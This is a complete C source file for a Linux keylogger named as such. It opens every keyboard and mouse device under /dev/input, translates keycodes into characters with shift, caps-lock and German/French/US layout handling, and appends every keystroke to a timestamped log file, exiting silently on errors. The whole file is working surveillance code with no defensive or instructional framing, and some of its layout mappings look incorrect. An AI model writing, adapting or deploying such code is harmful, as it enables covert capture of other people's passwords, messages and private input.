#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <time.h>
#include <locale.h>

#ifndef BITS_PER_LONG
#define BITS_PER_LONG (sizeof(long) * 8)
#endif

#ifndef KEY_MAX
#define KEY_MAX 0x2ff
#endif

// Configuration variables
char config_log_directory[256] = {0};
int config_dynamic_formatting = 1;  // Default to enabled

// Keyboard layout variables
char keyboard_layout[32] = "us";  // Default to US layout
int is_international_layout = 0;  // Flag for international layouts

// Helper function to test bits in ioctl results
static inline int test_bit(int bit, unsigned long *array) {
    int idx = bit / (sizeof(unsigned long) * 8);
    int offset = bit % (sizeof(unsigned long) * 8);
    return (array[idx] >> offset) & 1;
}

// Helper function to convert integer to string (replacing snprintf)
int int_to_string(int value, char *str) {
    if (value == 0) {
        str[0] = '0';
        str[1] = '\0';
        return 1;
    }

    char temp[16];
    int i = 0;
    int is_negative = 0;

    if (value < 0) {
        is_negative = 1;
        value = -value;
    }

    while (value > 0) {
        temp[i++] = '0' + (value % 10);
        value /= 10;
    }

    int len = i;
    if (is_negative) {
        str[0] = '-';
        len++;
    }

    int j = is_negative;
    while (i > 0) {
        str[j++] = temp[--i];
    }
    str[j] = '\0';

    return len;
}

// Function to detect system keyboard layout
void detect_keyboard_layout() {
    // Method 1: Try to get layout from environment variables
    char *lang_env = getenv("LANG");
    if (lang_env) {
        // Extract language code from LANG variable (e.g., en_US.UTF-8 -> en)
        char lang_code[16] = {0};
        char *dot_pos = strchr(lang_env, '.');
        if (dot_pos) {
            int len = dot_pos - lang_env;
            if (len > 2 && len < 16) {
                strncpy(lang_code, lang_env, len);
                lang_code[len] = '\0';
                
                // Check if it's an international layout
                if (strcmp(lang_code, "de") == 0 ||  // German
                    strcmp(lang_code, "fr") == 0 ||  // French
                    strcmp(lang_code, "es") == 0 ||  // Spanish
                    strcmp(lang_code, "it") == 0 ||  // Italian
                    strcmp(lang_code, "pt") == 0 ||  // Portuguese
                    strcmp(lang_code, "ru") == 0 ||  // Russian
                    strcmp(lang_code, "pl") == 0 ||  // Polish
                    strcmp(lang_code, "tr") == 0) {  // Turkish
                    is_international_layout = 1;
                }
                
                // Store the language code
                strncpy(keyboard_layout, lang_code, sizeof(keyboard_layout) - 1);
                keyboard_layout[sizeof(keyboard_layout) - 1] = '\0';
                return;
            }
        }
    }
    
    // Method 2: Try to read from setxkbmap (if available)
    FILE *xkb_pipe = popen("setxkbmap -query 2>/dev/null | grep layout | cut -d':' -f2 | tr -d ' '", "r");
    if (xkb_pipe) {
        char xkb_layout[32];
        if (fgets(xkb_layout, sizeof(xkb_layout), xkb_pipe)) {
            xkb_layout[strcspn(xkb_layout, "\n")] = 0;  // Remove newline
            if (strlen(xkb_layout) > 0) {
                strncpy(keyboard_layout, xkb_layout, sizeof(keyboard_layout) - 1);
                keyboard_layout[sizeof(keyboard_layout) - 1] = '\0';
                
                // Check if it's an international layout
                if (strcmp(xkb_layout, "de") == 0 ||  // German
                    strcmp(xkb_layout, "fr") == 0 ||  // French
                    strcmp(xkb_layout, "es") == 0 ||  // Spanish
                    strcmp(xkb_layout, "it") == 0 ||  // Italian
                    strcmp(xkb_layout, "pt") == 0 ||  // Portuguese
                    strcmp(xkb_layout, "ru") == 0 ||  // Russian
                    strcmp(xkb_layout, "pl") == 0 ||  // Polish
                    strcmp(xkb_layout, "tr") == 0) {  // Turkish
                    is_international_layout = 1;
                }
                
                pclose(xkb_pipe);
                return;
            }
        }
        pclose(xkb_pipe);
    }
    
    // Method 3: Try to read from localectl (systemd systems)
    FILE *locale_pipe = popen("localectl 2>/dev/null | grep 'X11 Layout' | cut -d':' -f2 | tr -d ' '", "r");
    if (locale_pipe) {
        char locale_layout[32];
        if (fgets(locale_layout, sizeof(locale_layout), locale_pipe)) {
            locale_layout[strcspn(locale_layout, "\n")] = 0;  // Remove newline
            if (strlen(locale_layout) > 0) {
                strncpy(keyboard_layout, locale_layout, sizeof(keyboard_layout) - 1);
                keyboard_layout[sizeof(keyboard_layout) - 1] = '\0';
                
                // Check if it's an international layout
                if (strcmp(locale_layout, "de") == 0 ||  // German
                    strcmp(locale_layout, "fr") == 0 ||  // French
                    strcmp(locale_layout, "es") == 0 ||  // Spanish
                    strcmp(locale_layout, "it") == 0 ||  // Italian
                    strcmp(locale_layout, "pt") == 0 ||  // Portuguese
                    strcmp(locale_layout, "ru") == 0 ||  // Russian
                    strcmp(locale_layout, "pl") == 0 ||  // Polish
                    strcmp(locale_layout, "tr") == 0) {  // Turkish
                    is_international_layout = 1;
                }
                
                pclose(locale_pipe);
                return;
            }
        }
        pclose(locale_pipe);
    }
    
    // If all methods fail, keep default "us" layout
}

// Function to read configuration from file
int read_config(const char *config_file) {
    FILE *file = fopen(config_file, "r");
    if (!file) {
        // Config file not found, use defaults
        return 0;
    }

    char line[512];
    while (fgets(line, sizeof(line), file)) {
        // Remove newline characters
        line[strcspn(line, "\n")] = 0;
        
        // Skip comments and empty lines
        if (line[0] == '#' || line[0] == '\0') {
            continue;
        }
        
        // Parse log_directory
        if (strncmp(line, "log_directory=", 14) == 0) {
            const char *value = line + 14;
            if (strlen(value) > 0 && strcmp(value, ".") != 0) {
                strncpy(config_log_directory, value, sizeof(config_log_directory) - 1);
                config_log_directory[sizeof(config_log_directory) - 1] = '\0';
            } else {
                config_log_directory[0] = '\0';  // Use default (same directory as executable)
            }
        }
        // Parse dynamic_formatting
        else if (strncmp(line, "dynamic_formatting=", 19) == 0) {
            const char *value = line + 19;
            config_dynamic_formatting = atoi(value);
        }
    }
    
    fclose(file);
    return 1;
}

// Function to get the current timestamp
void get_timestamp(char *buffer, size_t size) {
    time_t rawtime;
    struct tm *timeinfo;

    time(&rawtime);
    timeinfo = localtime(&rawtime);

    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", timeinfo);
}

// Function to convert keycode to character representation
const char* keycode_to_char(int keycode) {
    switch(keycode) {
        case KEY_A: return "a";
        case KEY_B: return "b";
        case KEY_C: return "c";
        case KEY_D: return "d";
        case KEY_E: return "e";
        case KEY_F: return "f";
        case KEY_G: return "g";
        case KEY_H: return "h";
        case KEY_I: return "i";
        case KEY_J: return "j";
        case KEY_K: return "k";
        case KEY_L: return "l";
        case KEY_M: return "m";
        case KEY_N: return "n";
        case KEY_O: return "o";
        case KEY_P: return "p";
        case KEY_Q: return "q";
        case KEY_R: return "r";
        case KEY_S: return "s";
        case KEY_T: return "t";
        case KEY_U: return "u";
        case KEY_V: return "v";
        case KEY_W: return "w";
        case KEY_X: return "x";
        case KEY_Y: return "y";
        case KEY_Z: return "z";
        case KEY_1: return "1";
        case KEY_2: return "2";
        case KEY_3: return "3";
        case KEY_4: return "4";
        case KEY_5: return "5";
        case KEY_6: return "6";
        case KEY_7: return "7";
        case KEY_8: return "8";
        case KEY_9: return "9";
        case KEY_0: return "0";
        case KEY_SPACE: return " ";
        case KEY_ENTER: return "\n";
        case KEY_BACKSPACE: return "[BACKSPACE]";
        case KEY_TAB: return "[TAB]";
        case KEY_MINUS: return "-";
        case KEY_EQUAL: return "=";
        case KEY_LEFTBRACE: return "[";
        case KEY_RIGHTBRACE: return "]";
        case KEY_BACKSLASH: return "\\";
        case KEY_SEMICOLON: return ";";
        case KEY_APOSTROPHE: return "'";
        case KEY_GRAVE: return "`";
        case KEY_COMMA: return ",";
        case KEY_DOT: return ".";
        case KEY_SLASH: return "/";
        case KEY_CAPSLOCK: return "[CAPSLOCK]";
        case KEY_F1: return "[F1]";
        case KEY_F2: return "[F2]";
        case KEY_F3: return "[F3]";
        case KEY_F4: return "[F4]";
        case KEY_F5: return "[F5]";
        case KEY_F6: return "[F6]";
        case KEY_F7: return "[F7]";
        case KEY_F8: return "[F8]";
        case KEY_F9: return "[F9]";
        case KEY_F10: return "[F10]";
        case KEY_F11: return "[F11]";
        case KEY_F12: return "[F12]";
        case KEY_ESC: return "[ESC]";
        case KEY_UP: return "[UP]";
        case KEY_DOWN: return "[DOWN]";
        case KEY_LEFT: return "[LEFT]";
        case KEY_RIGHT: return "[RIGHT]";
        case KEY_LEFTCTRL: return "[LCTRL]";
        case KEY_RIGHTCTRL: return "[RCTRL]";
        case KEY_LEFTSHIFT: return "[LSHIFT]";
        case KEY_RIGHTSHIFT: return "[RSHIFT]";
        case KEY_LEFTALT: return "[LALT]";
        case KEY_RIGHTALT: return "[RALT]";
        case KEY_SYSRQ: return "[SYSRQ]";
        case KEY_SCROLLLOCK: return "[SCROLL]";
        case KEY_PAUSE: return "[PAUSE]";
        case KEY_INSERT: return "[INSERT]";
        case KEY_HOME: return "[HOME]";
        case KEY_PAGEUP: return "[PAGEUP]";
        case KEY_PAGEDOWN: return "[PAGEDOWN]";
        case KEY_DELETE: return "[DELETE]";
        case KEY_END: return "[END]";
        case BTN_LEFT: return "\n[MOUSE LEFT]\n";
        case BTN_RIGHT: return "\n[MOUSE RIGHT]\n";
        case BTN_MIDDLE: return "\n[MOUSE MIDDLE]\n";
        case BTN_SIDE: return "\n[MOUSE SIDE]\n";
        case BTN_EXTRA: return "\n[MOUSE EXTRA]\n";
        default: return "[UNKNOWN]";
    }
}

int main() {
    // Read configuration file
    read_config("keylogger.conf");
    
    // Detect system keyboard layout
    detect_keyboard_layout();

    // Modifier key states
    int shift_pressed = 0;
    int caps_lock_on = 0;
    int alt_gr_pressed = 0;  // For international layouts

    // Find input devices
    int fd;
    char device_path[256];
    char log_filename[1024];  // Increased size to prevent buffer overflow
    struct input_event ev;
    ssize_t n;
    const char* key_char;

    // Get the directory of the executable
    char exe_path[512];  // Increased size to allow for longer paths
    char timestamp_str[32];
    time_t rawtime;
    struct tm *timeinfo;

    // Get current time for log filename (year, month, day, hour, minute - no seconds)
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(timestamp_str, sizeof(timestamp_str), "%Y%m%d_%H%M", timeinfo);

    // Use configured log directory if specified, otherwise use executable directory
    if (config_log_directory[0] != '\0') {
        // Use custom log directory from config
        snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", config_log_directory, timestamp_str);
    } else {
        // Use same directory as executable
        ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
        if (len != -1) {
            exe_path[len] = '\0';
            // Extract directory path
            char *last_slash = strrchr(exe_path, '/');
            if (last_slash) {
                *(last_slash+1) = '\0';
                // Ensure we don't exceed buffer size
                size_t exe_len = strlen(exe_path);
                if (exe_len < sizeof(log_filename) - 32) { // 32 for "keylog_" + timestamp + ".txt" + null terminator
                    snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", exe_path, timestamp_str);
                } else {
                    snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str); // fallback to current directory
                }
            } else {
                snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
            }
        } else {
            snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
        }
    }
    
    // Arrays to hold multiple device file descriptors
    int input_fds[20];  // Maximum 20 input devices
    int num_input_fds = 0;
    
    // Initialize all file descriptors to -1
    for (int i = 0; i < 20; i++) {
        input_fds[i] = -1;
    }
    
    // Try common input device paths
    for (int i = 0; i < 20; i++) {
        snprintf(device_path, sizeof(device_path), "/dev/input/event%d", i);
        
        fd = open(device_path, O_RDONLY);
        if (fd == -1) {
            continue;
        }
        
        // Check capabilities to determine if it has keys
        unsigned long evbit = 0;
        ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);
        
        // Use a larger buffer to accommodate all possible key codes
        unsigned long keybit[KEY_MAX/BITS_PER_LONG + 1] = {0};  // Initialize to zero
        ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), &keybit);
        
        // Check if it has keys we're interested in (keyboard or mouse)
        if (test_bit(KEY_A, keybit) || test_bit(KEY_1, keybit) || 
            test_bit(BTN_LEFT, keybit) || test_bit(BTN_RIGHT, keybit) || test_bit(BTN_MIDDLE, keybit)) {
            
            if (num_input_fds < 20) {
                input_fds[num_input_fds] = fd;
                num_input_fds++;
            } else {
                close(fd); // Too many devices, close this one
            }
        } else {
            close(fd);
        }
    }
    
    if (num_input_fds == 0) {
        // Silently exit if no input devices found
        return 1;
    }
    
    // Open log file in append mode using system calls
    int log_fd = open(log_filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (log_fd == -1) {
        // Silently exit if can't open log file
        for (int i = 0; i < num_input_fds; i++) {
            if (input_fds[i] != -1) close(input_fds[i]);
        }
        return 1;
    }
    
    // Create a more readable timestamp for the log message
    char readable_timestamp[64];
    strftime(readable_timestamp, sizeof(readable_timestamp), "%Y-%m-%d %H:%M", timeinfo);
    
    char start_msg[256];
    strcpy(start_msg, "\n=== Keylogger started at ");
    strcat(start_msg, readable_timestamp);
    strcat(start_msg, " ===\n");
    int msg_len = strlen(start_msg);
    write(log_fd, start_msg, msg_len);
    close(log_fd);
    
    // Main loop
    fd_set readfds;
    int max_fd = -1;
    
    // Determine max_fd for select()
    for (int i = 0; i < num_input_fds; i++) {
        if (input_fds[i] > max_fd) {
            max_fd = input_fds[i];
        }
    }
    
    while (1) {
        FD_ZERO(&readfds);
        for (int i = 0; i < num_input_fds; i++) {
            FD_SET(input_fds[i], &readfds);
        }
        
        if (select(max_fd + 1, &readfds, NULL, NULL, NULL) == -1) {
            // Silently break on select error
            break;
        }
        
        // Process all active file descriptors
        for (int i = 0; i < num_input_fds; i++) {
            if (FD_ISSET(input_fds[i], &readfds)) {
                n = read(input_fds[i], &ev, sizeof(ev));
                if (n == (ssize_t)-1) {
                    if (errno == EINTR)
                        continue;
                    else
                        break;
                } else if (n != sizeof(ev)) {
                    errno = EIO;
                    break;
                }
                
                if (ev.type == EV_KEY) { // Key event (press or release)
                    key_char = keycode_to_char(ev.code);

                    // Handle modifier key events (press and release)
                    if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                        if (ev.value == 1) {  // Key pressed
                            shift_pressed = 1;
                        } else if (ev.value == 0) {  // Key released
                            shift_pressed = 0;
                        }
                    } else if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
                        caps_lock_on = !caps_lock_on;  // Toggle caps lock on press
                    } else if (ev.code == KEY_RIGHTALT) {  // AltGr on many keyboards
                        if (ev.value == 1) {  // Key pressed
                            alt_gr_pressed = 1;
                        } else if (ev.value == 0) {  // Key released
                            alt_gr_pressed = 0;
                        }
                    }

                    // Only process key presses, not releases
                    if (ev.value == 1) {
                        int log_fd_evt = open(log_filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
                        if (log_fd_evt != -1) {
                            if (ev.code == KEY_ENTER) {
                                write(log_fd_evt, "\n", 1);
                            } else if (ev.code == BTN_LEFT || ev.code == BTN_RIGHT || ev.code == BTN_MIDDLE ||
                                       ev.code == BTN_SIDE || ev.code == BTN_EXTRA) {
                                // Mouse button pressed - create new lines
                                char mouse_msg[128];
                                strcpy(mouse_msg, "\n");
                                strcat(mouse_msg, key_char);
                                strcat(mouse_msg, "\n");
                                int mouse_len = strlen(mouse_msg);
                                write(log_fd_evt, mouse_msg, mouse_len);
                            } else if (ev.code != KEY_LEFTSHIFT && ev.code != KEY_RIGHTSHIFT && 
                                       ev.code != KEY_LEFTCTRL && ev.code != KEY_RIGHTCTRL &&
                                       ev.code != KEY_LEFTALT && ev.code != KEY_RIGHTALT &&
                                       ev.code != KEY_CAPSLOCK) {
                                // Handle character keys with modifiers (skip modifier keys themselves)
                                char actual_char[16] = {0}; // Buffer for actual character (increased to handle longer strings like [BACKSPACE])

                                // Map keycodes to characters considering modifier keys and configuration
                                if (config_dynamic_formatting) {
                                    // Dynamic formatting enabled - use modifier key states
                                    if (ev.code >= KEY_A && ev.code <= KEY_Z) {
                                        // Alphabet keys - handle shift and caps lock with layout consideration
                                        // Normal behavior:
                                        // - If caps lock is on and shift not pressed -> uppercase
                                        // - If caps lock is off and shift pressed -> uppercase
                                        // - If caps lock is on and shift pressed -> lowercase (shift overrides caps)
                                        // - If caps lock is off and shift not pressed -> lowercase
                                        if (!alt_gr_pressed) {
                                            // Determine if this should be uppercase based on caps lock and shift state
                                            int is_uppercase = (caps_lock_on && !shift_pressed) || (!caps_lock_on && shift_pressed);

                                            if (is_uppercase) {
                                                actual_char[0] = 'A' + (ev.code - KEY_A);
                                            } else {
                                                actual_char[0] = 'a' + (ev.code - KEY_A);
                                            }
                                        } else {
                                            // AltGr combinations - use original mapping
                                            strcpy(actual_char, key_char);
                                        }
                                    } else if (ev.code >= KEY_1 && ev.code <= KEY_0) {
                                        // Number keys - handle shift for symbols with layout consideration
                                        if (shift_pressed && !alt_gr_pressed) {
                                            // Handle different keyboard layouts for shift+numbers
                                            if (strcmp(keyboard_layout, "de") == 0) {
                                                // German layout: Shift+number gives symbols
                                                switch(ev.code) {
                                                    case KEY_1: strcpy(actual_char, "!"); break;
                                                    case KEY_2: strcpy(actual_char, "\""); break;
                                                    case KEY_3: strcpy(actual_char, "#"); break;
                                                    case KEY_4: strcpy(actual_char, "$"); break;
                                                    case KEY_5: strcpy(actual_char, "%"); break;
                                                    case KEY_6: strcpy(actual_char, "&"); break;
                                                    case KEY_7: strcpy(actual_char, "/"); break;
                                                    case KEY_8: strcpy(actual_char, "("); break;
                                                    case KEY_9: strcpy(actual_char, ")"); break;
                                                    case KEY_0: strcpy(actual_char, "="); break;
                                                    default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
                                                }
                                            } else if (strcmp(keyboard_layout, "fr") == 0) {
                                                // French layout: Shift+number gives symbols
                                                switch(ev.code) {
                                                    case KEY_1: strcpy(actual_char, "+"); break;
                                                    case KEY_2: strcpy(actual_char, "\""); break;
                                                    case KEY_3: strcpy(actual_char, "*"); break;
                                                    case KEY_4: strcpy(actual_char, "'"); break;
                                                    case KEY_5: strcpy(actual_char, "("); break;
                                                    case KEY_6: strcpy(actual_char, "-"); break;
                                                    case KEY_7: strcpy(actual_char, "§"); break;  // Section symbol
                                                    case KEY_8: strcpy(actual_char, "!"); break;
                                                    case KEY_9: strcpy(actual_char, "ç"); break;  // ç for 9
                                                    case KEY_0: strcpy(actual_char, "à"); break;  // à for 0
                                                    default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
                                                }
                                            } else {
                                                // US keyboard layout shift+number mappings (default)
                                                switch(ev.code) {
                                                    case KEY_1: strcpy(actual_char, "!"); break;
                                                    case KEY_2: strcpy(actual_char, "@"); break;
                                                    case KEY_3: strcpy(actual_char, "#"); break;
                                                    case KEY_4: strcpy(actual_char, "$"); break;
                                                    case KEY_5: strcpy(actual_char, "%"); break;
                                                    case KEY_6: strcpy(actual_char, "^"); break;
                                                    case KEY_7: strcpy(actual_char, "&"); break;
                                                    case KEY_8: strcpy(actual_char, "*"); break;
                                                    case KEY_9: strcpy(actual_char, "("); break;
                                                    case KEY_0: strcpy(actual_char, ")"); break;
                                                    default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
                                                }
                                            }
                                        } else {
                                            if (ev.code == KEY_0) {
                                                actual_char[0] = '0';
                                            } else {
                                                actual_char[0] = '0' + (ev.code - KEY_1 + 1);
                                            }
                                        }
                                    } else {
                                        // Handle other keys that might have shift variants with layout consideration
                                        if (!alt_gr_pressed) {  // Only handle shift, not AltGr combinations
                                            // Handle different keyboard layouts for special characters
                                            if (strcmp(keyboard_layout, "de") == 0) {
                                                // German layout mappings
                                                switch(ev.code) {
                                                    case KEY_MINUS: strcpy(actual_char, shift_pressed ? "?" : "ß"); break;  // ß on minus, ? on shift+minus
                                                    case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "`" : "´"); break;  // acute accent
                                                    case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "Ü" : "ü"); break;
                                                    case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "+" : "*"); break;
                                                    case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "Ö" : "ö"); break;
                                                    case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? "Ä" : "ä"); break;
                                                    case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "^" : "#"); break;
                                                    case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "°" : "°"); break;  // degree symbol
                                                    case KEY_COMMA: strcpy(actual_char, shift_pressed ? ";" : ","); break;
                                                    case KEY_DOT: strcpy(actual_char, shift_pressed ? ":" : "."); break;
                                                    case KEY_SLASH: strcpy(actual_char, shift_pressed ? "_" : "-"); break;
                                                    case KEY_SPACE: strcpy(actual_char, " "); break;
                                                    case KEY_TAB: strcpy(actual_char, "\t"); break;
                                                    case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
                                                    default:
                                                        // For special keys, use the original mapping
                                                        strcpy(actual_char, key_char);
                                                        break;
                                                }
                                            } else if (strcmp(keyboard_layout, "fr") == 0) {
                                                // French AZERTY layout mappings
                                                switch(ev.code) {
                                                    case KEY_MINUS: strcpy(actual_char, shift_pressed ? "6" : "6"); break;  // 6 is on the minus key in FR
                                                    case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "+" : "="); break;  // + on shift+= and = on =
                                                    case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "5" : "è"); break;  // 5 on shift+[ and è on [
                                                    case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "£" : "\""); break;  // £ on shift+] and " on ]
                                                    case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "*" : "µ"); break;  // * on shift+\ and µ on \ in French layout
                                                    case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? "M" : "m"); break;  // M/m in French layout
                                                    case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "%" : "'"); break;  // % on shift+' and ' on '
                                                    case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "²" : "<"); break;  // ² on shift+` and < on ` in French layout
                                                    case KEY_COMMA: strcpy(actual_char, shift_pressed ? "?" : ","); break;  // ? on shift+, and , on ,
                                                    case KEY_DOT: strcpy(actual_char, shift_pressed ? "." : "."); break;  // . stays the same
                                                    case KEY_SLASH: strcpy(actual_char, shift_pressed ? "/" : "§"); break;  // / on shift+/ and § on / in French layout
                                                    case KEY_SPACE: strcpy(actual_char, " "); break;
                                                    case KEY_TAB: strcpy(actual_char, "\t"); break;
                                                    case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
                                                    default:
                                                        // For special keys, use the original mapping
                                                        strcpy(actual_char, key_char);
                                                        break;
                                                }
                                            } else {
                                                // Default US layout mappings
                                                switch(ev.code) {
                                                    case KEY_MINUS: strcpy(actual_char, shift_pressed ? "_" : "-"); break;
                                                    case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "+" : "="); break;
                                                    case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "{" : "["); break;
                                                    case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "}" : "]"); break;
                                                    case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "|" : "\\"); break;
                                                    case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? ":" : ";"); break;
                                                    case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "\"" : "'"); break;
                                                    case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "~" : "`"); break;
                                                    case KEY_COMMA: strcpy(actual_char, shift_pressed ? "<" : ","); break;
                                                    case KEY_DOT: strcpy(actual_char, shift_pressed ? ">" : "."); break;
                                                    case KEY_SLASH: strcpy(actual_char, shift_pressed ? "?" : "/"); break;
                                                    case KEY_SPACE: strcpy(actual_char, " "); break;
                                                    case KEY_TAB: strcpy(actual_char, "\t"); break;
                                                    case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
                                                    default:
                                                        // For special keys, use the original mapping
                                                        strcpy(actual_char, key_char);
                                                        break;
                                                }
                                            }
                                        } else {
                                            // AltGr combinations - use original mapping
                                            strcpy(actual_char, key_char);
                                        }
                                    }
                                } else {
                                    // Dynamic formatting disabled - use basic character mapping
                                    strcpy(actual_char, key_char);
                                }

                                int char_len = strlen(actual_char);
                                write(log_fd_evt, actual_char, char_len);
                            }
                            close(log_fd_evt);
                        }
                    }
                }
            }
        }
    }
    
    // Close file and clean up
    int log_fd_end = open(log_filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (log_fd_end != -1) {
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char end_readable_timestamp[64];
        strftime(end_readable_timestamp, sizeof(end_readable_timestamp), "%Y-%m-%d %H:%M", timeinfo);
        char end_msg[128];
        strcpy(end_msg, "\n=== Keylogger stopped at ");
        strcat(end_msg, end_readable_timestamp);
        strcat(end_msg, " ===\n");
        int end_len = strlen(end_msg);
        write(log_fd_end, end_msg, end_len);
        close(log_fd_end);
    }
    
    // Close all input file descriptors
    for (int i = 0; i < num_input_fds; i++) {
        if (input_fds[i] != -1) close(input_fds[i]);
    }
    
    return 0;
}